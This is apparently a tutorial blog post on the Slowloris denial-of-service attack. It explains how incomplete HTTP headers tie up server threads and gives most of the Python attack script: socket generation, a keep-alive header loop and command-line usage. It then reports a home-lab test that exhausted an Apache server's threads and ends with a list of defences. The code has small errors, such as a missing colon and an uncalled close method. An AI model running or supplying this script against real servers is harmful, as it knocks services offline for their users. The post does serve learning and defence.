Slowloris attack

The slowloris attack is a form of DoS (Denial of Service) attack, which is able to incapacitate certain vulnerable web servers, e.g. Apache. The slowloris attack doesn't require high amount of resources like regular DoS attacks. It accomplishes this, with the clever usage of how the HTTP protocol operates.

See a valid HTTP GET request in the image gallery.

CRLF means a new line. The HTTP GET request header is expected to be terminated by an empty line(CRLFCRLF).

This attack vector utilizes this requirement and generates a HTTP GET request header without terminating it with an empty line and hence leaving the connection open. Thereby it simulates a very slow connection, which wouldn't normally register as malicious intent.This would consume a thread and and by generating a large number of "slow' requests, the server is unable to process valid requests.

Implementation

The life-cycle would look like this:

1. Create Socket object
2. Create TCP connection
3. Send HTTP request
4. (Wait)
5. Close socket

Socket creation

def create_socket_and_send_http_get(ip, port):
See Github repo for complete code (can't add here due to char limit)

Further steps would are required

1. Generate a defined number (parameter) of requests
2. Keep track of the socket objects by adding them to a list as they are created

def generate_requests(ip, port, socket_count)
    #Socket list to track all the active requests towards the host
    socket_list = []
    #Create the defined number of sockets
    for _ in range(int(socket_count)):
        try:
            print("Creating socket nr {}".format(_))
            s = create_socket_and_send_http_get(ip, port)
        except socket.error:
            #Close the socket in case of error
            if 's' in locals():
                s.close()
            break
        #Add the generated socket to the list
        socket_list.append(s)
    print("Finished creating {} sockets".format(socket_count))
    return socket_list

Sending keep alive requests

  - In case the request is terminated or received an error during keep-alive:

    1. Remove the inactive socket from the list
    2. Calculate the difference between the active number of sockets in the list and count provided in the parameter
    3. Regenerate the requests for the difference
    4. Merge the the newly created list with the original active socket list

  - In case the program is terminated:

    1. Close all the sockets in the active list

def send_keep_alive(ip, port, socket_count, socket_list, timer):
    while True:
        try:
            #Send keep alive requests for all sockets in the socket_list
            print("Sending keep alive to {} active sockets".format(len(socket_list)))
            for s in socket_list:
                try:
                    s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode('UTF-8'))
                except socket.error:
                    #In case of an error, remove the socket from the active list and close it
                    if 's' in locals():
                        socket_list.remove(s)
                        s.close

            #Get the number of inactive sockets by comparing the number of active sockets and the socket_count paramater
            #Regenerate sockets for the difference between the above numbers
            socket_count_delta = socket_count - len(socket_list)
            if socket_count_delta > 0:
                print("Regenerating {} sockets".format(socket_count_delta))
                socket_list_delta = generate_requests(ip, port, socket_count_delta)
                socket_list += socket_list_delta

            #Wait for a defined period (timer parameter), before the next loop iteration
            time.sleep(timer)

        except (KeyboardInterrupt, SystemExit):
            print("Stopping Slowloris")
            for s in socket_list:
                socket_list.remove(s)
                s.close()
            print("All sockets closed")
            break

Fitting the pieces together

Since this is quite a simple logic, it can be put together in the main method. I've just added some minimal parameter check and marshaling of the parameters, otherwise it just requires the usage of the parts already explained above.

def main()
    HELP_MESSAGE = """
    Script help
    slowlorispylot.py [host] [port] [number of sockets] [timeout]
    
    E.g. slowlorispylot.py 127.0.0.1 80 200 15
    """
    if len(sys.argv) < 5:
        print("Parameter missing".format(sys.argv[0]))
        print(HELP_MESSAGE)
        return
    ip = sys.argv[1]
    port = sys.argv[2]
    socket_count = int(sys.argv[3])
    timer = int(sys.argv[4])
    #Generate request
    socket_list = generate_requests(ip, port, socket_count)
    #Keep requests active
    send_keep_alive(ip, port, socket_count, socket_list, timer)

Limitations

This logic is only covering IPv4 requests and doesn't handle proxies, since it is meant mainly as a practice exercise. There are other existing libraries with a more complete coverage, which are referenced below.

Testing

I'm running a WAMP server with Apache/2.4.39 (Win64) version on my Windows 10 machine and executing the slowloris script from a Raspberry PI running Kali Linux from the same local network towards the Windows machine.

When looking at the requests more closely with Wireshark, the TCP segments are visible in the packet capture, as well as the incomplete request - see attached image (Wireshark 1).

The dummy HTTP headers keep the request open, as seen in the image (Wireshark 2).

Getting also a timeout when querying the server from the remote host:

$ curl 192.168.2.10
curl: (7) Failed to connect to 192.168.2.10 port 80: Connection timed out

The following message has also appeared in the Apache server logs:

[Wed Nov 06 08:35:20.953958 2019] [mpm_winnt:error] [pid 1344:tid 2336] AH00326: Server ran out of threads to serve requests. Consider raising the ThreadsPerChild setting

Defending against slowloris attacks

    Using a different web server, which isn't affected e.g. nginx
    Limit connections per IP address, however this wouldn't help in case of a distributed attack
    Install a load balancer, because it only forwards complete HTTP requests
    Install an Apache module, which mitigates this problem e.g. mod_qos, mod_antiloris, etc.
